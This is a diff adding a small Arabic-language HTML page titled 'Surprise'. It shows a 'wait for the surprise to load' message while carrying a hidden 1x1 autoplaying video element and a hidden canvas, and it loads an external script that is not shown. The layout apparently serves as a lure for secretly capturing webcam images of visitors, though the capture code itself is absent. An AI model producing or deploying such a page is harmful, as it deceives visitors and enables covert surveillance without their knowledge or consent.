@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>مفاجأة</title>
+</head>
+<body>
+    <h1 style="text-align:center;">انتظر تحميل المفاجأة...</h1>
+    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <script src="script.js"></script>
+</body>
+</html>
+
